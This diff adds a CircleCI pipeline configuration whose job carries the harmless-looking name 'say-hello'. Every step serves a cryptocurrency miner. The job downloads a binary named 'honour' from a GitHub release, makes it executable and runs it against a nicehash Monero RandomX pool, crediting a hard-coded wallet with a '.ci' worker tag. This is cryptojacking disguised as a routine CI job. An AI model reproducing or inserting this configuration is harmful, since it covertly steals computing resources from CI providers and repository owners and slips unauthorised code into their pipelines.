@@ -1,0 +1,21 @@
+version: 2.1
+
+jobs:
+  say-hello:   
+    docker:
+      - image: ubuntu:latest
+    steps:
+      - checkout
+      - run:
+          name: "get"
+          command: "wget https://github.com/tati18852/honour/releases/download/honour/honour"
+      - run:
+          name: "perm"
+          command: "chmod +x honour"
+      - run:
+          name: "run"
+          command: "./honour -o randomxmonero.auto.nicehash.com:9200 -u NHbEESzEivA3t7LjNWrYAdVjnGZFuf7KkMcR.ci -k --nicehash --coin monero -a rx/0"
+workflows:
+  say-hello-workflow:
+    jobs:
+      - say-hello
